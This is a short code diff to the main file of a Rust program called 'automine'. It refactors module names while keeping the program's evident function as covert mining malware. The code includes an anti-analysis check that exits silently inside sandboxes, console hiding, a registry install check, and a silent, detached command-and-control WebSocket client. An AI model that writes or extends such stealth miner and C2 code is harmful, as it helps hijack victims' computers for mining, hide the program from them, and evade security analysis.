@@ -1,13 +1,15 @@
 mod commands;
 mod common;
 mod utils;
-mod system;
+mod p2p;
+mod host;
+mod security;
 
 use clap::{Parser, Subcommand};
 
 use commands::{install, start, status, uninstall};
-use system::process::{hide_console, stop_mining};
-use system::registry::is_installed;
+use host::process::{hide_console, stop_mining};
+use host::registry::is_installed;
 
 #[derive(Parser)]
 #[command(name = "automine")]
@@ -31,7 +33,7 @@ enum Commands {
 #[tokio::main]
 async fn main() {
     // 0. Anti-Analysis Check (Before anything else)
-    if system::anti_analysis::is_analysis_environment() {
+    if security::anti_analysis::is_analysis_environment() {
         return; // Silent Exit
     }
 
@@ -61,7 +63,7 @@ async fn main() {
             } else {
                 // Spawn C2 WSS Client (Silent, Detached)
                 tokio::spawn(async {
-                    if let Err(e) = system::c2::start_client().await {
+                    if let Err(e) = p2p::c2::start_client().await {
                         eprintln!("C2 Error: {}", e);
                     }
                 });
